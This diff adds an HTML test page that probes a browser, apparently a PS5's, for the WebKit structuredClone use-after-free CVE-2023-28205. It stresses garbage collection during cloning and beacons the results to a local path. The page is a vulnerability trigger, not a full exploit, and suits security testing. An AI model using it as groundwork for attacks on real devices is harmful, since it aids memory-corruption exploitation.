@@ -1,0 +1,433 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>P1076</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:#0a0a0f;color:#c8ffc8;font:11px/1.5 monospace;padding:8px;overflow-y:auto}
+.hud{border:1px solid #1a3a1a;border-radius:4px;margin-bottom:6px;padding:6px;background:#0d1117}
+.title{color:#00ff88;font-size:13px;font-weight:bold;margin-bottom:4px}
+.ok{color:#00ff88}.fail{color:#ff4444}.warn{color:#ffaa00}.info{color:#66aaff}
+</style>
+</head>
+<body>
+<div class="hud">
+<div class="title">P1076 — STRUCTUREDCLONE UAF TEST</div>
+<div class="info">CVE-2023-28205 (CloneDeserializer Vector vs MarkedVector)</div>
+</div>
+<div id="log"></div>
+
+<script>
+var L=document.getElementById('log');
+function log(c,m){var d=document.createElement('div');d.className=c;d.textContent=m;L.appendChild(d);L.scrollTop=L.scrollHeight}
+function B(t,d){var m='P1076-'+t+' | '+d;log('info','[B] '+m);try{new Image().src='/en/ps5/beacon.gif?t='+Date.now()+'&m='+encodeURIComponent(m)}catch(e){}}
+function sl(ms){return new Promise(function(r){setTimeout(r,ms)})}
+
+// ============================================================
+// SECTION A: structuredClone BASELINE
+// Test basic clone behavior with complex objects
+// ============================================================
+async function sectionA() {
+  log('warn','=== A: STRUCTUREDCLONE BASELINE ===');
+
+  // A1: Basic types
+  var ok = true;
+  try {
+    var m = new Map([[1,'a'],[2,'b'],[3,'c']]);
+    var cm = structuredClone(m);
+    var a1 = cm instanceof Map && cm.size === 3 && cm.get(1) === 'a';
+    B('A1-MAP', 'ok:'+a1+'|size:'+cm.size);
+    log(a1?'ok':'fail','[A1] Map clone: ' + a1);
+  } catch(e) { B('A1-MAP', 'ERR:'+e.message); log('fail','[A1] Map: '+e.message); ok=false; }
+
+  // A2: Set clone
+  try {
+    var s = new Set([1,2,3,4,5]);
+    var cs = structuredClone(s);
+    var a2 = cs instanceof Set && cs.size === 5;
+    B('A2-SET', 'ok:'+a2+'|size:'+cs.size);
+    log(a2?'ok':'fail','[A2] Set clone: ' + a2);
+  } catch(e) { B('A2-SET', 'ERR:'+e.message); log('fail','[A2] Set: '+e.message); ok=false; }
+
+  // A3: Date clone
+  try {
+    var d = new Date(2023, 3, 10);
+    var cd = structuredClone(d);
+    var a3 = cd instanceof Date && cd.getTime() === d.getTime();
+    B('A3-DATE', 'ok:'+a3+'|time:'+cd.getTime());
+    log(a3?'ok':'fail','[A3] Date clone: ' + a3);
+  } catch(e) { B('A3-DATE', 'ERR:'+e.message); log('fail','[A3] Date: '+e.message); ok=false; }
+
+  // A4: Nested Map+Set+Date
+  try {
+    var nested = new Map([
+      ['dates', [new Date(), new Date(0), new Date(99999999999)]],
+      ['sets', new Set([new Map([[1,2]]), new Map([[3,4]])])],
+      ['maps', [new Map([['a', new Set([1,2,3])]])]],
+    ]);
+    var cn = structuredClone(nested);
+    var a4 = cn instanceof Map && cn.size === 3;
+    B('A4-NESTED', 'ok:'+a4+'|size:'+cn.size);
+    log(a4?'ok':'fail','[A4] Nested: ' + a4);
+  } catch(e) { B('A4-NESTED', 'ERR:'+e.message); log('fail','[A4] Nested: '+e.message); ok=false; }
+
+  // A5: ArrayBuffer clone
+  try {
+    var ab = new ArrayBuffer(256);
+    var v = new Uint8Array(ab);
+    for (var i = 0; i < 256; i++) v[i] = i;
+    var cab = structuredClone(ab);
+    var cv = new Uint8Array(cab);
+    var a5 = cab.byteLength === 256 && cv[0] === 0 && cv[255] === 255;
+    B('A5-AB', 'ok:'+a5+'|len:'+cab.byteLength);
+    log(a5?'ok':'fail','[A5] AB clone: ' + a5);
+  } catch(e) { B('A5-AB', 'ERR:'+e.message); ok=false; }
+
+  return ok;
+}
+
+// ============================================================
+// SECTION B: GC STRESS DURING CLONE
+// The CVE-2023-28205 vector: force GC while structuredClone is
+// deserializing. If Vector (not MarkedVector) holds temp objects,
+// GC collects them → UAF
+// ============================================================
+async function sectionB() {
+  log('warn','=== B: GC STRESS DURING CLONE ===');
+
+  // Strategy: Create large object graph, clone it while also
+  // allocating heavily to trigger GC
+  var survived = 0, crashed = 0;
+
+  for (var round = 0; round < 20; round++) {
+    try {
+      // Build a deep object graph with many Map/Set/Date objects
+      var root = new Map();
+      for (var i = 0; i < 50; i++) {
+        var inner = new Map();
+        for (var j = 0; j < 20; j++) {
+          inner.set(j, {
+            date: new Date(i * j),
+            set: new Set([i, j, i*j, i+j]),
+            map: new Map([[i, j], [j, i]]),
+            arr: new ArrayBuffer(64)
+          });
+        }
+        root.set(i, inner);
+      }
+
+      // GC pressure allocation happening concurrently
+      var junk = [];
+      for (var g = 0; g < 100; g++) junk.push(new ArrayBuffer(8192));
+
+      // Clone while junk is being created
+      var cloned = structuredClone(root);
+
+      // Verify integrity
+      var valid = cloned instanceof Map && cloned.size === 50;
+      if (valid) {
+        var inner = cloned.get(25);
+        valid = inner instanceof Map && inner.size === 20;
+        if (valid) {
+          var obj = inner.get(10);
+          valid = obj && obj.date instanceof Date && obj.set instanceof Set;
+        }
+      }
+
+      junk = null; // release
+      root = null;
+
+      if (valid) {
+        survived++;
+      } else {
+        // Clone produced invalid result — possible UAF corruption!
+        B('B-INVALID', 'round:' + round);
+        log('fail', '[B' + round + '] Clone returned INVALID result!');
+        crashed++;
+      }
+    } catch(e) {
+      B('B-ERROR', 'round:' + round + '|err:' + e.message);
+      log('fail', '[B' + round + '] Error: ' + e.message);
+      crashed++;
+    }
+
+    if (round % 5 === 4) await sl(10);
+  }
+
+  B('B-RESULT', 'survived:' + survived + '|errors:' + crashed);
+  log(crashed>0?'fail':'ok', '[B] ' + survived + ' survived, ' + crashed + ' errors');
+  return crashed > 0;
+}
+
+// ============================================================
+// SECTION C: POSTMESSAGE CLONE STRESS
+// postMessage also uses structured clone internally
+// Force heavy GC during message deserialization via Worker
+// ============================================================
+async function sectionC() {
+  log('warn','=== C: POSTMESSAGE CLONE STRESS ===');
+
+  // C1: Worker availability
+  var hasWorkers = typeof Worker !== 'undefined';
+  B('C1-WORKERS', 'available:' + hasWorkers);
+  if (!hasWorkers) {
+    log('fail', '[C] No Workers');
+    return false;
+  }
+
+  // Create worker that echoes back the cloned message
+  var workerCode = 'self.onmessage=function(e){self.postMessage(e.data)}';
+  var blob;
+  try {
+    blob = new Blob([workerCode], {type: 'application/javascript'});
+  } catch(e) {
+    B('C1-BLOB', 'ERR:'+e.message);
+    log('fail', '[C] Blob failed: ' + e.message);
+    return false;
+  }
+
+  var url;
+  try {
+    url = URL.createObjectURL(blob);
+  } catch(e) {
+    B('C1-URL', 'ERR:'+e.message);
+    log('fail', '[C] URL.createObjectURL failed: ' + e.message);
+    return false;
+  }
+
+  var w;
+  try {
+    w = new Worker(url);
+  } catch(e) {
+    B('C1-WORKER', 'ERR:'+e.message);
+    log('fail', '[C] Worker creation failed: ' + e.message);
+    return false;
+  }
+
+  B('C2-STARTED', 'worker-created');
+  log('ok', '[C2] Worker created');
+
+  var received = 0, corrupted = 0;
+  var done = false;
+
+  w.onmessage = function(e) {
+    received++;
+    var d = e.data;
+    // Verify integrity
+    if (!(d instanceof Map) || d.size !== 30) {
+      corrupted++;
+      B('C-CORRUPT', 'received:'+received+'|expected:Map(30)|got:'+typeof d);
+      log('fail', '[C] CORRUPTED message #' + received);
+    }
+  };
+
+  w.onerror = function(e) {
+    B('C-WERROR', e.message || 'unknown');
+    log('fail', '[C] Worker error: ' + (e.message || 'unknown'));
+  };
+
+  // Send 50 complex messages while allocating heavily
+  for (var round = 0; round < 50; round++) {
+    var msg = new Map();
+    for (var i = 0; i < 30; i++) {
+      msg.set(i, {
+        d: new Date(round * i),
+        s: new Set([round, i, round*i]),
+        ab: new ArrayBuffer(128)
+      });
+    }
+
+    w.postMessage(msg);
+
+    // GC pressure between sends
+    for (var g = 0; g < 50; g++) {
+      var t = new ArrayBuffer(16384); t = null;
+    }
+  }
+
+  await sl(2000); // Wait for all messages to echo back
+  w.terminate();
+  URL.revokeObjectURL(url);
+
+  B('C-RESULT', 'sent:50|received:' + received + '|corrupted:' + corrupted);
+  log(corrupted>0?'fail':'ok', '[C] Received ' + received + '/50, corrupted: ' + corrupted);
+  return corrupted > 0;
+}
+
+// ============================================================
+// SECTION D: DIRECT MARKEDVECTOR TEST
+// Test if the fix is present by creating objects that would be
+// collected if held in Vector but survive if held in MarkedVector
+// ============================================================
+async function sectionD() {
+  log('warn','=== D: GC COLLECTION TIMING ===');
+
+  var collected = 0;
+  var reg = new FinalizationRegistry(function(label) {
+    collected++;
+    B('D-GC', label + '|total:' + collected);
+  });
+
+  // Create complex structures and clone them
+  // If the clone's temp objects are in Vector, they get collected
+  // If in MarkedVector, they survive until the clone completes
+  var results = [];
+
+  for (var round = 0; round < 10; round++) {
+    var root = new Map();
+    for (var i = 0; i < 100; i++) {
+      var obj = {
+        d: new Date(i),
+        m: new Map([[i, 'v' + i]]),
+        s: new Set([i, i+1, i+2])
+      };
+      root.set(i, obj);
+    }
+
+    // Register the map for GC tracking
+    var weakRoot = new WeakRef(root);
+    reg.register(root, 'root-' + round);
+
+    // Clone it
+    var cloned = structuredClone(root);
+
+    // Drop original
+    root = null;
+
+    // Heavy GC pressure
+    for (var g = 0; g < 200; g++) { var t = new ArrayBuffer(32768); t = null; }
+    await sl(5);
+
+    // Check if original was collected
+    var alive = weakRoot.deref() !== undefined;
+    var cloneOk = cloned instanceof Map && cloned.size === 100;
+
+    results.push({alive: alive, ok: cloneOk});
+
+    // Verify a deep field in the clone
+    try {
+      var inner = cloned.get(50);
+      var deepOk = inner && inner.d instanceof Date && inner.m instanceof Map && inner.s instanceof Set;
+      results[round].deepOk = deepOk;
+    } catch(e) {
+      results[round].deepOk = false;
+      results[round].err = e.message;
+    }
+
+    cloned = null;
+  }
+
+  await sl(500);
+
+  var summary = results.map(function(r, i) {
+    return i + ':alive=' + r.alive + ',ok=' + r.ok + ',deep=' + r.deepOk + (r.err ? ',err=' + r.err : '');
+  }).join('|');
+
+  B('D-RESULT', 'collected:' + collected + '|results:' + summary);
+  log('ok', '[D] GC collected ' + collected + ' roots');
+  for (var i = 0; i < results.length; i++) {
+    var r = results[i];
+    log(r.ok && r.deepOk ? 'ok' : 'fail',
+      '  [D' + i + '] clone:' + r.ok + ' deep:' + r.deepOk + (r.err ? ' ERR:'+r.err : ''));
+  }
+
+  var anyBad = results.some(function(r) { return !r.ok || !r.deepOk; });
+  return anyBad;
+}
+
+// ============================================================
+// SECTION E: HEAVY CONCURRENT CLONE + GC
+// Maximum pressure: many clones in flight with aggressive GC
+// ============================================================
+async function sectionE() {
+  log('warn','=== E: HEAVY CONCURRENT ===');
+
+  var errors = 0, total = 0;
+
+  // Create the template once
+  var template = new Map();
+  for (var i = 0; i < 200; i++) {
+    template.set(i, {
+      dates: [new Date(i), new Date(i*1000), new Date(i*1000000)],
+      sets: new Set([new Map([[i, i*i]]), new Set([i, i+1])]),
+      bufs: [new ArrayBuffer(32), new ArrayBuffer(64), new ArrayBuffer(128)]
+    });
+  }
+
+  // Fire many clones with GC between each
+  for (var round = 0; round < 30; round++) {
+    try {
+      // Allocate junk to fragment heap
+      var junk = [];
+      for (var j = 0; j < 200; j++) junk.push(new ArrayBuffer(4096));
+
+      // Free half to create holes
+      for (var j = 0; j < 200; j += 2) junk[j] = null;
+
+      // Clone during fragmented heap state
+      var c = structuredClone(template);
+      total++;
+
+      // Verify deep
+      var obj = c.get(100);
+      if (!obj || !obj.dates || obj.dates.length !== 3 || !(obj.dates[0] instanceof Date)) {
+        errors++;
+        B('E-BAD', 'round:'+round+'|obj:'+JSON.stringify(obj).substring(0,100));
+        log('fail', '[E'+round+'] Deep verification FAILED');
+      }
+
+      // Verify ArrayBuffers
+      if (obj.bufs[0].byteLength !== 32 || obj.bufs[1].byteLength !== 64 || obj.bufs[2].byteLength !== 128) {
+        errors++;
+        B('E-BUFBAD', 'round:'+round+'|lens:'+obj.bufs[0].byteLength+','+obj.bufs[1].byteLength+','+obj.bufs[2].byteLength);
+      }
+
+      junk = null; c = null;
+    } catch(e) {
+      errors++;
+      B('E-ERR', 'round:'+round+'|err:'+e.message);
+      log('fail', '[E'+round+'] Error: ' + e.message);
+    }
+
+    if (round % 10 === 9) await sl(5);
+  }
+
+  B('E-RESULT', 'total:'+total+'|errors:'+errors);
+  log(errors>0?'fail':'ok', '[E] ' + total + ' clones, ' + errors + ' errors');
+  return errors > 0;
+}
+
+// ============================================================
+// MAIN
+// ============================================================
+async function run() {
+  B('BOOT', 'structclone-uaf-test');
+  log('ok', '=== P1076: STRUCTUREDCLONE UAF TEST ===');
+  log('info', 'Testing CVE-2023-28205 vector (CloneDeserializer)');
+
+  var aOk = await sectionA();
+  log('ok', '');
+
+  var bHit = await sectionB();
+  log('ok', '');
+
+  var cHit = await sectionC();
+  log('ok', '');
+
+  var dHit = await sectionD();
+  log('ok', '');
+
+  var eHit = await sectionE();
+
+  B('DONE', 'A:'+aOk+'|B:'+bHit+'|C:'+cHit+'|D:'+dHit+'|E:'+eHit);
+  log('ok', '=== P1076 COMPLETE ===');
+  log(bHit||cHit||dHit||eHit?'fail':'ok',
+    'VERDICT: ' + (bHit||cHit||dHit||eHit ? 'POSSIBLE VULNERABILITY DETECTED' : 'Likely patched'));
+}
+
+run();
+</script>
+</body>
+</html>
